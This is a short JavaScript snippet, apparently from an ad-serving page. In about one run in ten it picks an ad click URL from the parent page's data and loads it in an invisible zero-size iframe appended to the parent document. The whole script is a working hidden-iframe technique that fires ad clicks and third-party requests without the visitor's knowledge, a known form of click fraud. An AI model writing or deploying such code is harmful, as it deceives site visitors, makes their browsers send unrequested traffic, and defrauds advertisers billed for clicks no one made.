(function() {	
    var url = "http://www.google.com.vn",dp="none";
	
    if (typeof(parent.arrDataTVCV_add) != "undefined" && parent.arrDataTVCV_add.click != "" && parent.arrDataTVCV_add.click!= null && parent.arrDataTVCV_add.click!= 'null') {
		url = parent.arrDataTVCV_add.click;
		if(parent.arrDataTVCV_add.link3rd !="")dp=parent.arrDataTVCV_add.link3rd;
		}
    if (url && url != null && url != 'hidden' && url != 'null') {
        url = url.split(",");
        var rd = Math.floor(Math.random() * url.length);
        url = url[rd];
    }
    var seed = Math.random();
    var utmURL = url;
    var isChromium = window.chrome,
        vendorName = window.navigator.vendor;
    if (seed < 0.1) {
        var iframe = parent.document.createElement('iframe');
		if(dp=="hidden")iframe.style.visibility = dp;
		else iframe.style.display = "none";
        iframe.style.width = "0px";
        iframe.style.height = "0px";
        iframe.src = utmURL;
        parent.document.body.appendChild(iframe);
    };
})();